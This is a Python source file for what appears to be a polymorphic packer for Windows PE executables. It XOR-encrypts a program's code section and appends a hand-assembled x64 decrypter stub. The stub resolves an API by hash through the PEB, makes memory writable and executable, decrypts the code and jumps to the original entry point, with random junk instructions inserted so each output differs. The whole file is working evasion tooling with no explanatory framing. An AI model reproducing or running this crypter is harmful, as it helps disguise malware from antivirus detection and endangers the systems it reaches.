import random
import pefile
import sys

DECRYPTER = [
    [ 0xE8, 0x00, 0x00, 0x00, 0x00 ],           # call qword 0x5
    [ 0x5A ],                                   # pop rdx
    [ 0x48, 0x83, 0xEA, 0x06 ],                 # sub rdx,byte +0x6
    [ 0x52 ],                                   # push rdx
    [ 0x65, 0x48, 0x8B, 0x1C, 0x25, 0x60, 0x00, 0x00, 0x00 ], # mov ebx,[gs:0x60]
    [ 0x48, 0x8B, 0x5B, 0x18 ],                 # mov rbx,[rbx+0x18]                    14
    [ 0x48, 0x8B, 0x5B, 0x10 ],                 # mov rbx,[rbx+0x10]
    [ 0x48, 0x8B, 0x1B ],                       # mov rbx,[rbx]
    [ 0x48, 0x8B, 0x1B ],                       # mov rbx,[rbx]
    [ 0x48, 0x8B, 0x43, 0x30 ],                 # mov rax,[rbx+0x18]                    22
    [ 0x50 ],                                   # push rax
    [ 0x8B, 0x40, 0x3C ],                       # mov eax,[rax+0x3c]
    [ 0x48, 0x03, 0x04, 0x24 ],                 # add rax,[rsp]
    [ 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00 ],     # mov eax,[rax+0x88]
    [ 0x48, 0x03, 0x04, 0x24 ],                 # add rax,[rsp]
    [ 0x8B, 0x58, 0x20 ],                       # mov ebx,[rax+0x20]
    [ 0x48, 0x03, 0x1c, 0x24 ],                 # add rbx,[rsp]
    [ 0x8B, 0x48, 0x1C ],                       # mov ecx,[rax+0x1c]
    [ 0x48, 0x03, 0x0c, 0x24 ],                 # add rcx,[rsp]
    [ 0x8B, 0x50, 0x24 ],                       # mov edx,[rax+0x24]
    [ 0x48, 0x03, 0x14, 0x24 ],                 # add rdx,[rsp]
    [ 0x51 ],                                   # push rcx
    
    [ 0x8B, 0x33 ],                             # GetFunctionLoop: mov esi,[rbx]            4e
    [ 0x48, 0x03, 0x74, 0x24, 0x08 ],           # add rsi,[rsp+0x8]
    [ 0x52 ],                                   # push rdx
    [ 0x56 ],                                   # push rsi
    [ 0xE8, 0x3B, 0x00, 0x00, 0x00 ],           # call qword Hash                           57
    [ 0x5A ],                                   # pop rdx
    [ 0x3D, 0x3C, 0xD1, 0x38, 0x00, 0x0f, 0x84, 0x88, 0x88, 0x88, 0x88 ], # cmp eax,0x38d13c | jz GetFunctionOut
    [ 0x83, 0xC3, 0x04 ],                       # add ebx,byte +0x4
    [ 0x83, 0xC2, 0x02 ],                       # add edx,byte +0x2             
    [ 0xE9, 0xE4, 0xff, 0xff, 0xff ],           # jmp GetFunctionLoop           6d
    
    [ 0x59 ],                                   # GetFunctionOut: pop rcx       77
    [ 0x31, 0xDB ],                             # xor ebx,ebx
    [ 0x66, 0x67, 0x8B, 0x1A ],                 # mov bx,[edx]
    [ 0x6B, 0xDB, 0x04 ],                       # imul ebx,ebx,byte +0x4
    [ 0x58 ],                                   # pop rax
    [ 0x67, 0x03, 0x04, 0x19 ],                 # add eax,[ecx+ebx]             81
    
    
    
    [ 0x48, 0x8B, 0x0C, 0x24 ],                 # mov rcx,[rsp]
    [ 0xBA, 0x11, 0x11, 0x11, 0x11 ],           # mov edx, 0x11111111
    [ 0x48, 0x29, 0xD1 ],                       # sub rcx, rdx
    [ 0x51 ],                                   # push rcx
    [ 0x41, 0xB8, 0x40, 0x00, 0x00, 0x00 ],     # mov r8d, 0x40
    [ 0x48, 0x83, 0xEC, 0x08 ],                 # sub rsp, byte +0x8
    [ 0x49, 0x89, 0xE1 ],                       # mov r9,rsp
    [ 0xFF, 0xD0 ],                             # call rax
    
    [ 0x48, 0x83, 0xC4, 0x08 ],                 # add rsp, byte +0x8
    [ 0x59 ],                                   # pop rcx
    [ 0x5A ],                                   # pop rdx
    
    [ 0x48, 0x89, 0xC8 ],                       # mov rax,rcx
    [ 0x48, 0x05, 0x22, 0x22, 0x22, 0x22 ],     # add rax,0x22222222            a9
    [ 0x81, 0x31, 0x33, 0x33, 0x33, 0x33 ],     # loop: xor dword [rcx],0x33333333   ae
    [ 0x48, 0x39, 0xd1, 0x0f, 0x8d, 0x05, 0x00, 0x00, 0x00 ],  # cmp rcx, rdx  |  jge out
    [ 0x48, 0x83, 0xC1, 0x04 ],                       # add rcx,byte +0x4             bb
    [ 0xe9, 0xe7, 0xff, 0xff, 0xff ],           # jmp loop
    [ 0xFF, 0xE0 ],                             # out: jmp rax                  c5
    
    [ 0x48, 0x89, 0xf1 ],                       # Hash: mov rcx, rsi
    [ 0x31, 0xC0 ],                             # xor eax,eax
    [ 0x31, 0xD2 ],                             # xor edx,edx                   d0
    [ 0x80, 0x39, 0x00, 0x0F, 0x84, 0xb8, 0x00, 0x00, 0x00 ],  # HashLoop: cmp byte [rcx],0x0  |  jz HashOut     d2
    [ 0x8A, 0x11 ],                             # mov dl,[rcx]
    [ 0x80, 0xCA, 0x60 ],                       # or dl,0x60                    df
    [ 0x01, 0xD0 ],                             # add eax,edx
    [ 0xD1, 0xE0 ],                             # shl eax,1
    [ 0x83, 0xC1, 0x01 ],                       # add ecx,byte +0x1
    [ 0xE9, 0xED, 0x00, 0x00, 0x00 ],           # jmp HashLoop
    [ 0xC2, 0x08, 0x00 ]                        # HashOut: ret
]

JMP_OFFSETS = [
    [ 0x58, 108 ],          # call Hash
    [ 0x64, 11 ],           # je GetFunctionOut
    [ 0x6f, -37 ],          # jmp GetFunctionLoop    
    [ 0xb8, 9 ],            # jge out
    [ 0xc1, -24 ],          # jmp loop
    [ 0xd3, 17 ],           # jz HashOut
    [ 0xe4, -26 ]           # jmp HashLoop
]

CRUFT = [
    [ 0x90 ],               # nop
    [ 0x48, 0x21, 0xc0 ],         # and eax, eax
    [ 0x48, 0x21, 0xdb ],         # and ebx,ebx
    [ 0x48, 0x21, 0xc9 ],         # and ecx,ecx
    [ 0x48, 0x21, 0xd2 ],         # and edx,edx 
    [ 0x48, 0x87, 0xdb ],         # xchg ebx,ebx
    [ 0x48, 0x87, 0xc9 ],         # xchg ecx,ecx
    [ 0x48, 0x87, 0xd2 ],         # xchg edx,edx 
    [ 0x48, 0x09, 0xc0 ],         # or eax,eax
    [ 0x48, 0x09, 0xdb ],         # or ebx,ebx
    [ 0x48, 0x09, 0xc9 ],         # or ecx,ecx
    [ 0x48, 0x09, 0xd2 ],         # or edx,edx 
    [ 0x48, 0x83, 0xe0, 0xff ],   # and eax, 0xffffffff
    [ 0x48, 0x83, 0xe3, 0xff ],   # and ebx, 0xffffffff
    [ 0x48, 0x83, 0xe1, 0xff ],   # and ecx, 0xffffffff
    [ 0x48, 0x83, 0xe2, 0xff ],   # and edx, 0xffffffff 
]

encode_int32 = lambda x: [(0xff & (x >> (8 * i))) for i in range(4)]
twos_comp = lambda x: x - (1 << 32)

def mutate(length, entry, key):
    decrypter = DECRYPTER
    jmp_offsets = JMP_OFFSETS
    
    # replace length, entry point and key values
    decrypter[39] = decrypter[39][:1] + encode_int32(length - 1) + decrypter[39][1 + 4:]
    decrypter[50] = decrypter[50][:2] + encode_int32(entry) + decrypter[50][2 + 4:]
    decrypter[51] = decrypter[51][:2] + encode_int32(key) + decrypter[51][2 + 4:]
    
    # start inserting goop
    for i in range(100):
        #break
        cruft = random.choice(CRUFT)
        
        # Start at 1 so we know where our "call 5" is going to be
        # TODO: work around this by juggling the sub operation later on
        insert_index = random.randint(1, len(decrypter))
        insert_offset = reduce(lambda a, x: a + len(x), decrypter[:insert_index], 0)
        
        # Now we need to wriggle the values and offsets for our JMPs
        # so we don't go missing once we insert the cruft
        for offset in jmp_offsets:
            current_jmp_target = offset[0] + offset[1] + 4

            if offset[1] > 0:
                if offset[0] <= insert_offset and current_jmp_target >= insert_offset:
                    offset[1] = offset[1] + len(cruft)
            else:
                if offset[0] >= insert_offset and current_jmp_target <= insert_offset:
                    offset[1] = offset[1] - len(cruft)
        
            if offset[0] >= insert_offset: # the address of the jmp opcode itself will change, update it
                offset[0] = offset[0] + len(cruft)

        decrypter.insert(insert_index, cruft)
                
    # flatten our decrypter, we don't care about opcode boundaries now
    final = [item for sublist in decrypter for item in sublist]

    # replace the jmp values 
    for offset in jmp_offsets:
        if offset[1] > 0:
            final = final[:offset[0]] + encode_int32(offset[1]) + final[offset[0] + 4:]
        else:
            final = final[:offset[0]] + encode_int32(twos_comp(offset[1])) + final[offset[0] + 4:]

    '''
    for l in decrypter:
        print(map(hex, l))
    '''

    data = bytearray(final)
    return data
    
# This only really covers the ones we care about, RWX and code
def get_characteristics(bitfield):
    result = []
    if bitfield & pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_CNT_CODE']:
        result.append('Code')
    if bitfield & pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE']:
        result.append('Executable')
    if bitfield & pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_READ']:
        result.append('Readable')
    if bitfield & pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_WRITE']:
        result.append('Writable')
    return result

def derp():
    print('USAGE: python {0} TARGET'.format(sys.argv[0]))
    print('  TARGET: target PE file')
    sys.exit(1)
       
    
if __name__ == '__main__':
    if len(sys.argv) < 2:
        derp()
    target_file = sys.argv[1]
    pe = pefile.PE(target_file)
    """
    print('Entry point    : {0:#010x}'.format(pe.OPTIONAL_HEADER.AddressOfEntryPoint))
    print('Characteristics: {0}'.format(pe.FILE_HEADER.Characteristics))

    print('\nSections:')
    """
    target_section = None
    target_index = 0
    for section in pe.sections:
        """
        print(' ' + section.Name)
        print('    VirtualAddress  : {0:#010x}'.format(section.VirtualAddress))
        print('    Misc_VirtualSize: {0:#010x}'.format(section.Misc_VirtualSize))
        print('    SizeOfRawData   : {0:#010x}'.format(section.SizeOfRawData))
        print('    Characteristics : {0} ({1:#010x})'.format(get_characteristics(section.Characteristics), section.Characteristics))
        """
        # TODO: this should really check if it contains the entry point instead
        if target_section is None and section.Characteristics & (pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_CNT_CODE'] | pefile.SECTION_CHARACTERISTICS['IMAGE_SCN_MEM_EXECUTE']):
            target_section = section
            break
        target_index = target_index + 1

    print('\nTargeted section  : ' + target_section.Name)
    
    random.seed()
    key = random.randint(0, 0xffffffff)
    length = target_section.Misc_VirtualSize
    entry = pe.OPTIONAL_HEADER.AddressOfEntryPoint - target_section.VirtualAddress
    original_size = target_section.Misc_VirtualSize
    
    print('Key               : {0:#010x}'.format(key))
    print('Length            : {0:#x}'.format(length))
    print('Entry Offset      : {0:#010x}'.format(entry))
    
    shellcode = mutate(length, entry, key)
    
    print('Original code size: {0} bytes'.format(original_size))
    print('Decrypter size    : {0} bytes'.format(len(shellcode)))
    print('Space available   : {0} bytes'.format(target_section.SizeOfRawData - target_section.Misc_VirtualSize))

    # Expand the section and bump all of the section offsets if necessary
    offset_shim = 0
    while target_section.Misc_VirtualSize + len(shellcode) > target_section.SizeOfRawData + offset_shim:
        offset_shim = offset_shim + pe.OPTIONAL_HEADER.FileAlignment
        
    print('\nExpanding code section {0} bytes\n'.format(offset_shim))
    
    # Add a block of data to the end of the file
    pe.__data__ = (pe.__data__[:len(pe.__data__)] + '\0' * offset_shim)
    
    # Move all the affected section data and update pointers
    for i in xrange(len(pe.sections) - 1, target_index, -1):
        section = pe.sections[i]
        print('{0}{1}: {2} -> {3}'.format(section.Name, ' ' * (16 -  len(section.Name)), section.PointerToRawData, section.PointerToRawData + offset_shim))
        data = section.get_data()
        pe.set_bytes_at_offset(section.PointerToRawData + offset_shim, data)
        pe.sections[i].PointerToRawData += offset_shim    
        
    # Stuff new code into the back of the section
    target_section.Misc_VirtualSize += len(shellcode)
    target_section.SizeOfRawData += offset_shim
    
    file_offset = target_section.PointerToRawData + original_size
    pe.set_bytes_at_offset(file_offset, str(shellcode))

    # And now 'encrypt' the existing code
    buffer = bytearray(target_section.get_data())
    key_index = 0
    buffer_index = 0
    for buffer_index in xrange(original_size):
        buffer[buffer_index] ^= (key >> (key_index * 8)) & 0xff
        key_index = (key_index + 1) % 4
    pe.set_bytes_at_offset(target_section.PointerToRawData, str(buffer))

    # Update the Entry point
    pe.OPTIONAL_HEADER.AddressOfEntryPoint = target_section.VirtualAddress + original_size

    # Tweak SizeOfCode in file header
    pe.OPTIONAL_HEADER.SizeOfCode += offset_shim
    
    # Strip relocations, since it tweaks the code as it's loaded to account 
    # for the base addresses and this will break our encryption
    pe.FILE_HEADER.Characteristics |= pefile.IMAGE_CHARACTERISTICS['IMAGE_FILE_RELOCS_STRIPPED']
    
    # Finally, fuck with the internals of pefile to make sure our file offsets
    # are correct
    for structure in pe.__structures__:
        if structure.get_file_offset() > target_section.PointerToRawData + original_size:
            structure.__file_offset__ += offset_shim

    output_filename = '{0}.{1:08x}.exe'.format(target_file, key)
    pe.write(filename = output_filename)
    
    print('\nDONE - ' + output_filename)
    